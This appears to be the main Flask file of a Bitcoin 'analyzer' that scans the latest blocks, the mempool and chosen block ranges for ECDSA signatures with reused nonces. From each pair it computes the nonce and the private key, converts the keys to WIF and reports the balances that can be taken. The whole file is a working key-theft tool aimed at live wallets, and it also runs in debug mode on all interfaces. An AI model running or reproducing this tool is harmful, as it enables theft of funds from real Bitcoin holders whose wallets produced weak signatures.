import os
import json
import logging
import requests
from flask import Flask, render_template, jsonify, request, send_file
from btc_analyzer import BTCAnalyzer
try:
    from attached_assets.validators import validate_transaction_id
    from attached_assets.address_list import ADDRESSES_TO_CHECK
    from attached_assets.utils import calculate_message_hash, format_hex
except ImportError:
    # Fallback implementations
    def validate_transaction_id(tx_id):
        return isinstance(tx_id, str) and len(tx_id) == 64 and all(c in '0123456789abcdefABCDEF' for c in tx_id)
    
    ADDRESSES_TO_CHECK = [
        "1LS1h8UJFgAFqRsw8WqjszBdJWDQg3hj6d",
        "1MZ7153HMuxXTuR2R1t78mGSdzaAtNbBWX",
        "1Kc5Y27TTCyqHY4YwEWKEsJPbnnBudyMGL"
    ]
    
    def calculate_message_hash(tx_hash):
        import hashlib
        return hashlib.sha256(tx_hash.encode()).digest()
    
    def format_hex(value):
        if isinstance(value, int):
            return f"{value:064x}"
        return str(value)

try:
    from logging_config import initialize_all_loggers
    # Initialize comprehensive logging
    loggers = initialize_all_loggers()
    logger = loggers['main']
    api_logger = loggers['api']
    key_recovery_logger = loggers['key_recovery']
except ImportError:
    # Fallback logging setup
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger('main')
    api_logger = logging.getLogger('api')
    key_recovery_logger = logging.getLogger('key_recovery')

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev_key_only")

# Initialize BTC analyzer
analyzer = BTCAnalyzer()

@app.route('/')
def index():
    logger.debug("Rendering index page")
    return render_template('index.html')

@app.route('/transaction')
def transaction():
    logger.debug("Rendering transaction page")
    return render_template('transaction.html')

@app.route('/address')
def address():
    logger.debug("Rendering address page")
    return render_template('address.html')

@app.route('/ecdsa-analysis')
def ecdsa_analysis():
    logger.debug("Rendering ECDSA analysis page")
    return render_template('ecdsa_analysis.html')

@app.route('/standalone-calculator')
def standalone_calculator():
    logger.debug("Serving standalone ECDSA calculator")
    return render_template('standalone_calculator.html')

@app.route('/download-calculator')
def download_calculator():
    logger.debug("Serving downloadable ECDSA calculator")
    return send_file('static/ecdsa_standalone.html', 
                     mimetype='text/html',
                     as_attachment=True,
                     download_name='bitcoin_ecdsa_calculator.html')

@app.route('/api/analyze/transaction', methods=['POST'])
def analyze_transaction():
    try:
        api_logger.info("Received transaction analysis request")
        data = request.get_json()
        api_logger.debug(f"Request data: {data}")

        if not data or 'tx_id' not in data:
            logger.error("No transaction ID provided")
            return jsonify({'error': 'Transaction ID is required'}), 400

        tx_id = data['tx_id']
        if not validate_transaction_id(tx_id):
            logger.error(f"Invalid transaction ID format: {tx_id}")
            return jsonify({'error': 'Invalid transaction ID format'}), 400

        api_logger.info(f"Analyzing transaction: {tx_id}")
        results = analyzer.analyze_transaction(tx_id)

        # Log results summary
        weak_sigs_count = len(results.get('weak_signatures', []))
        private_keys_found = results.get('private_keys_found', 0)

        api_logger.info(f"Transaction {tx_id} analysis complete: {weak_sigs_count} weak signatures, {private_keys_found} private keys found")

        if private_keys_found > 0:
            api_logger.critical(f"🚨 PRIVATE KEYS RECOVERED from transaction {tx_id}: {private_keys_found} keys!")

        return jsonify(results)

    except Exception as e:
        logger.error(f"Error analyzing transaction: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to analyze transaction'}), 500

@app.route('/api/analyze/address', methods=['POST'])
def analyze_address():
    try:
        logger.debug("Received address analysis request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        if not data or 'address' not in data:
            logger.error("No address provided")
            return jsonify({'error': 'Address is required'}), 400

        address = data['address']
        logger.debug(f"Analyzing address: {address}")

        try:
            results = analyzer.analyze_address(address)
            logger.debug(f"Analysis results: {results}")

            # Add additional error handling
            if isinstance(results, dict) and 'error' in results:
                return jsonify({
                    'address': address,
                    'error': results['error'],
                    'status': 'failed'
                }), 200

            return jsonify(results)
        except requests.exceptions.RequestException as req_err:
            logger.error(f"Network error analyzing address {address}: {str(req_err)}")
            return jsonify({
                'address': address,
                'error': f"Network error: {str(req_err)}",
                'status': 'failed'
            }), 200
        except ValueError as val_err:
            logger.error(f"Value error analyzing address {address}: {str(val_err)}")
            return jsonify({
                'address': address, 
                'error': f"Invalid address format: {str(val_err)}",
                'status': 'failed'
            }), 200

    except Exception as e:
        logger.error(f"Error analyzing address: {str(e)}", exc_info=True)
        return jsonify({
            'address': data.get('address', 'unknown'),
            'error': f"Failed to analyze address: {str(e)}",
            'status': 'failed'
        }), 200

@app.route('/api/analyze/ecdsa', methods=['POST'])
def analyze_ecdsa():
    try:
        logger.debug("Received ECDSA analysis request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        # Check if transaction ID is provided for auto-parameter extraction
        if 'tx_id' in data and data['tx_id']:
            logger.debug(f"Auto-extracting parameters from transaction: {data['tx_id']}")

            try:
                # Analyze the transaction to get signature parameters
                result = analyzer.analyze_transaction(data['tx_id'])

                if not result.get('weak_signatures'):
                    return jsonify({'error': 'No weak signatures found in transaction'}), 400

                # Find signatures with reused nonce (same r value)
                signatures = result.get('weak_signatures', [])
                nonce_reuse_sigs = None

                for sig in signatures:
                    if sig.get('type') == 'nonce_reuse' and 'all_signatures' in sig:
                        all_sigs = sig['all_signatures']
                        if len(all_sigs) >= 2:
                            # Take first two signatures with same r value
                            sig1 = all_sigs[0]
                            sig2 = all_sigs[1]

                            nonce_reuse_sigs = {
                                'r1': sig1['r'],
                                's1': sig1['s'], 
                                'm1': sig1['message'],
                                'r2': sig2['r'],
                                's2': sig2['s'],
                                'm2': sig2['message'],
                                'input_index_1': sig1.get('input_index', 0),
                                'input_index_2': sig2.get('input_index', 1)
                            }
                            break

                if not nonce_reuse_sigs:
                    return jsonify({'error': 'No nonce reuse detected in transaction'}), 400

                # Convert hex strings to integers
                params = {}
                for param in ['r1', 's1', 'm1', 'r2', 's2', 'm2']:
                    hex_value = nonce_reuse_sigs[param]
                    if isinstance(hex_value, str):
                        if hex_value.startswith('0x'):
                            hex_value = hex_value[2:]
                        params[param] = int(hex_value, 16)
                    else:
                        params[param] = hex_value

                logger.debug(f"Extracted parameters: {params}")

            except Exception as e:
                logger.error(f"Error extracting parameters from transaction: {e}")
                return jsonify({'error': f'Failed to extract parameters: {str(e)}'}), 500

        # Manual parameter input (legacy support)
        else:
            # Manual parameter input (legacy support)
            required_fields = ['r1', 's1', 'm1', 'r2', 's2', 'm2']
            if not data or not all(field in data for field in required_fields):
                return jsonify({'error': 'Missing required ECDSA parameters'}), 400

            # Convert hex strings to integers
            try:
                params = {}
                for param in required_fields:
                    hex_value = data[param]
                    if isinstance(hex_value, str) and hex_value.startswith('0x'):
                        hex_value = hex_value[2:]
                    params[param] = int(hex_value, 16)
            except ValueError:
                return jsonify({'error': 'Invalid hex values provided'}), 400

        # Calculate k (signing secret)
        try:
            # Check if r values are the same (nonce reuse)
            if params['r1'] != params['r2']:
                return jsonify({'error': 'R values must be the same for nonce reuse attack'}), 400

            s1_minus_s2 = (params['s1'] - params['s2']) % analyzer.curve.order
            m1_minus_m2 = (params['m1'] - params['m2']) % analyzer.curve.order

            if s1_minus_s2 == 0:
                return jsonify({'error': 'S values are identical, cannot recover nonce'}), 400

            s1_minus_s2_inv = pow(s1_minus_s2, -1, analyzer.curve.order)
            k = (m1_minus_m2 * s1_minus_s2_inv) % analyzer.curve.order

            # Calculate private key
            r1_inv = pow(params['r1'], -1, analyzer.curve.order)
            x = ((params['s1'] * k - params['m1']) * r1_inv) % analyzer.curve.order

            # Build response with extracted parameters for transparency
            response = {
                'k': format_hex(k),
                'x': format_hex(x),
                'success': True,
                'extracted_params': {
                    'r1': format_hex(params['r1']),
                    's1': format_hex(params['s1']),
                    'm1': format_hex(params['m1']),
                    'r2': format_hex(params['r2']),
                    's2': format_hex(params['s2']),
                    'm2': format_hex(params['m2'])
                }
            }

            # Add input indices if available from auto-extraction
            if 'tx_id' in data and 'nonce_reuse_sigs' in locals():
                response['input_indices'] = {
                    'input_1': nonce_reuse_sigs.get('input_index_1'),
                    'input_2': nonce_reuse_sigs.get('input_index_2')
                }
                response['tx_id'] = data['tx_id']

            return jsonify(response)

        except Exception as e:
            logger.error(f"Error in ECDSA calculations: {str(e)}", exc_info=True)
            return jsonify({'error': 'Failed to perform ECDSA calculations'}), 500

    except Exception as e:
        logger.error(f"Error processing ECDSA analysis: {str(e)}", exc_info=True)
        return jsonify({'error': 'Failed to process ECDSA analysis'}), 500

@app.route('/api/address/analysis/<address>', methods=['GET'])
def get_address_analysis(address):
    """Get detailed analysis for a specific address"""
    try:
        from logging_config import AddressAnalysisLogger
        address_logger = AddressAnalysisLogger()

        # Get comprehensive address analysis
        analysis = address_logger.get_address_analysis(address)

        # Get nonce reuse pairs
        nonce_pairs = address_logger.find_nonce_reuse_pairs(address)
        analysis['nonce_reuse_pairs'] = nonce_pairs

        return jsonify(analysis)

    except Exception as e:
        logger.error(f"Error getting address analysis: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/address/signatures/<address>', methods=['GET'])
def get_address_signatures(address):
    """Get all signatures for a specific address with r,s,z comparison data"""
    try:
        from logging_config import AddressAnalysisLogger
        address_logger = AddressAnalysisLogger()

        log_file = address_logger.get_address_log_file(address)

        if not os.path.exists(log_file):
            return jsonify({
                'address': address,
                'signatures': [],
                'r_value_analysis': {}
            })

        with open(log_file, 'r') as f:
            data = json.load(f)

        # Prepare signature comparison data
        all_signatures = []
        r_value_analysis = {}

        for entry in data:
            for sig in entry.get('signatures', []):
                sig_data = {
                    'tx_id': entry['tx_id'],
                    'timestamp': entry['timestamp'],
                    'r': sig.get('r'),
                    's': sig.get('s'),
                    'z': sig.get('z'),
                    'input_index': sig.get('input_index'),
                    'r_reused': sig.get('r_reused', False),
                    'reuse_history': sig.get('reuse_history', [])
                }
                all_signatures.append(sig_data)

                # Track r-value usage
                r_val = sig.get('r')
                if r_val:
                    if r_val not in r_value_analysis:
                        r_value_analysis[r_val] = {
                            'count': 0,
                            'transactions': [],
                            'different_z_values': set(),
                            'potential_recovery': False
                        }

                    r_value_analysis[r_val]['count'] += 1
                    r_value_analysis[r_val]['transactions'].append(entry['tx_id'])
                    r_value_analysis[r_val]['different_z_values'].add(sig.get('z'))

                    # Check if this r-value can be used for recovery
                    if len(r_value_analysis[r_val]['different_z_values']) > 1:
                        r_value_analysis[r_val]['potential_recovery'] = True

        # Convert sets to lists for JSON serialization
        for r_val in r_value_analysis:
            r_value_analysis[r_val]['different_z_values'] = list(r_value_analysis[r_val]['different_z_values'])

        return jsonify({
            'address': address,
            'total_signatures': len(all_signatures),
            'signatures': all_signatures,
            'r_value_analysis': r_value_analysis,
            'reusable_r_values': {r: data for r, data in r_value_analysis.items() if data['potential_recovery']}
        })

    except Exception as e:
        logger.error(f"Error getting address signatures: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/addresses/known')
def get_known_addresses():
    logger.debug("Fetching known addresses")
    return jsonify(ADDRESSES_TO_CHECK)

@app.route('/api/auto-scan')
def auto_scan_weak_signatures():
    """Automatically scan recent Bitcoin transactions for weak signatures"""
    try:
        from btc_analyzer import BTCAnalyzer
        analyzer = BTCAnalyzer()

        # Fetch recent transactions from blockchain.info
        import requests

        # Get latest blocks and scan for weak signatures
        try:
            response = requests.get('https://blockchain.info/latestblock', timeout=15)
            if response.status_code != 200:
                return jsonify({
                    'success': False, 
                    'error': f'Failed to fetch latest block: HTTP {response.status_code}'
                })

            latest_block = response.json()
            block_hash = latest_block.get('hash')

            if not block_hash:
                return jsonify({
                    'success': False, 
                    'error': 'No block hash found in response'
                })

            # Get recent block transactions
            block_response = requests.get(f'https://blockchain.info/rawblock/{block_hash}', timeout=15)
            if block_response.status_code != 200:
                return jsonify({
                    'success': False, 
                    'error': f'Failed to fetch block data: HTTP {block_response.status_code}'
                })

            block_data = block_response.json()
            transactions = block_data.get('tx', [])

            if not transactions:
                return jsonify({
                    'success': True,
                    'scanned_transactions': 0,
                    'weak_signatures_found': 0,
                    'results': [],
                    'block_hash': block_hash,
                    'message': 'No transactions found in latest block'
                })

            weak_signatures_found = []
            analyzed_count = 0

            # Scan up to 10 recent transactions for performance
            for tx in transactions[:10]:
                tx_id = tx.get('hash')
                if tx_id:
                    try:
                        result = analyzer.analyze_transaction(tx_id)
                        analyzed_count += 1
                        
                        if result.get('private_keys_found', 0) > 0:
                            weak_signatures_found.append({
                                'tx_id': tx_id,
                                'private_keys_found': result.get('private_keys_found'),
                                'weak_signatures': result.get('weak_signatures', [])
                            })
                            api_logger.warning(f"🚨 Found vulnerable transaction: {tx_id}")
                    except Exception as e:
                        api_logger.debug(f"Error analyzing transaction {tx_id}: {e}")
                        continue

            return jsonify({
                'success': True,
                'scanned_transactions': analyzed_count,
                'weak_signatures_found': len(weak_signatures_found),
                'results': weak_signatures_found,
                'block_hash': block_hash
            })

        except requests.exceptions.Timeout:
            return jsonify({
                'success': False, 
                'error': 'Request timeout - blockchain API is slow'
            })
        except requests.exceptions.ConnectionError:
            return jsonify({
                'success': False, 
                'error': 'Connection error - blockchain API unavailable'
            })
        except requests.exceptions.RequestException as e:
            return jsonify({
                'success': False, 
                'error': f'Network error: {str(e)}'
            })

    except Exception as e:
        api_logger.error(f"Auto scan error: {e}", exc_info=True)
        return jsonify({
            'success': False, 
            'error': f'Internal error: {str(e)}'
        })

@app.route('/api/monitor-mempool')
def monitor_mempool():
    """Monitor Bitcoin mempool for transactions with weak signatures"""
    try:
        import requests

        # Get unconfirmed transactions from mempool
        response = requests.get('https://blockchain.info/unconfirmed-transactions?format=json', timeout=10)
        if response.status_code == 200:
            mempool_data = response.json()
            transactions = mempool_data.get('txs', [])

            from btc_analyzer import BTCAnalyzer
            analyzer = BTCAnalyzer()

            vulnerable_txs = []

            # Scan up to 10 mempool transactions
            for tx in transactions[:10]:
                tx_id = tx.get('hash')
                if tx_id:
                    try:
                        result = analyzer.analyze_transaction(tx_id)
                        if result.get('private_keys_found', 0) > 0:
                            vulnerable_txs.append({
                                'tx_id': tx_id,
                                'fee': tx.get('fee', 0),
                                'size': tx.get('size', 0),
                                'private_keys_found': result.get('private_keys_found'),
                                'timestamp': tx.get('time', 0)
                            })
                    except Exception as e:
                        logging.debug(f"Error analyzing mempool tx {tx_id}: {e}")
                        continue

            return jsonify({
                'success': True,
                'mempool_scanned': len(transactions[:10]),
                'vulnerable_transactions': len(vulnerable_txs),
                'results': vulnerable_txs
            })

        return jsonify({'success': False, 'error': 'Failed to access mempool'})

    except Exception as e:
        logging.error(f"Mempool monitor error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/scan-block', methods=['POST'])
def scan_block():
    """Scan Bitcoin block for vulnerable transactions and recover private keys"""
    try:
        data = request.get_json()
        block_identifier = data.get('block_identifier')
        max_blocks = data.get('max_blocks', 10)

        if not block_identifier:
            return jsonify({'error': 'Block hash or number is required'}), 400

        from block_scanner import BlockScanner
        scanner = BlockScanner()

        logger.info(f"Starting block scan from: {block_identifier}")

        # Scan blocks sequentially
        found_keys = scanner.scan_blocks_sequential(block_identifier, max_blocks)

        return jsonify({
            'success': True,
            'block_identifier': block_identifier,
            'max_blocks_scanned': max_blocks,
            'keys_found': len(found_keys),
            'results': found_keys
        })

    except Exception as e:
        logger.error(f"Block scan error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/search-block-transactions', methods=['POST'])
def search_block_transactions():
    """Search transactions in Bitcoin blocks for weak signatures and convert to WIF keys"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400

        start_block = data.get('start_block')
        max_blocks = data.get('max_blocks', 10)

        if not start_block:
            return jsonify({'success': False, 'error': 'start_block is required'}), 400

        logger.info(f"Starting block transaction search from: {start_block}, max blocks: {max_blocks}")

        # Import and use the BlockTransactionHunter
        from block_transaction_hunter import BlockTransactionHunter
        hunter = BlockTransactionHunter()

        # Perform the search
        result = hunter.search_range_starting_from_block(start_block, max_blocks)

        if 'error' in result:
            return jsonify({'success': False, 'error': result['error']})

        # Check if any private keys were found and format response accordingly
        private_keys_found = []
        for weak_sig in result.get('weak_signatures', []):
            if weak_sig.get('type') == 'recovered_private_key':
                private_keys_found.append({
                    'private_key_hex': weak_sig['private_key_hex'],
                    'wif_compressed': weak_sig['wif_compressed'],
                    'wif_uncompressed': weak_sig['wif_uncompressed'],
                    'primary_address': weak_sig['primary_address'],
                    'primary_balance': weak_sig['primary_balance'],
                    'total_balance': weak_sig['total_balance'],
                    'recovery_method': weak_sig['recovery_method'],
                    'all_addresses': weak_sig['all_addresses'],
                    'all_balances': weak_sig['all_balances']
                })

        if private_keys_found:
            logger.warning(f"🚨 PRIVATE KEYS RECOVERED: {len(private_keys_found)} keys found!")
            for key in private_keys_found:
                logger.warning(f"Key: {key['private_key_hex'][:16]}... - Balance: {key['total_balance']} BTC")

        return jsonify({
            'success': True,
            'result': result,
            'private_keys_found': private_keys_found,
            'total_keys_recovered': len(private_keys_found)
        })

    except Exception as e:
        logger.error(f"Error in block transaction search: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Search failed: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)